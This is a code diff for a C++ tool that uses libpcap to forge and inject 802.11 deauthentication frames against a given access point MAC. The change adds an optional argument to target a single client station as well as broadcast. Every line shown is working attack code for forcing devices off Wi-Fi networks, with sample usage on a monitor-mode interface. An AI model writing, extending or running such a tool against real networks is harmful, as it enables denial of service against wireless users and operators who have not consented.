@@ -13,8 +13,8 @@ using namespace std;
 
 void usage()
 {
-    printf("syntax: deauth <interface> <macAddress> [-c <macAddress>]\n");
-    printf("sample: deauth wlan0 AA:BB:CC:DD:EE:FF\n");
+    printf("syntax: deauth <interface> <ap mac> [<station mac>]\n");
+    printf("sample: deauth mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
 }
 
 int main(int argc, char *argv[])
@@ -30,6 +30,20 @@ int main(int argc, char *argv[])
     pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     Mac dmac(argv[2]);
     Mac broadmac(Mac::broadcastMac());
+    Mac smac;
+
+    switch (argc)
+    {
+    case 3:
+        smac = broadmac;
+        break;
+    case 4:
+        smac = Mac(argv[3]);
+        break;
+    default:
+        usage();
+        return -1;
+    }
 
     std::unique_ptr<dot11>
         radio_hdr(new dot11);
@@ -39,7 +53,7 @@ int main(int argc, char *argv[])
 
     deauth_hdr->subtype = 0x00c0;
     deauth_hdr->dur = 0;
-    memcpy(deauth_hdr->smac, static_cast<uint8_t *>(broadmac), Mac::SIZE);
+    memcpy(deauth_hdr->smac, static_cast<uint8_t *>(smac), Mac::SIZE);
     memcpy(deauth_hdr->dmac, static_cast<uint8_t *>(dmac), Mac::SIZE);
     memcpy(deauth_hdr->bssid, static_cast<uint8_t *>(dmac), Mac::SIZE);
     deauth_hdr->flagseq = 0;
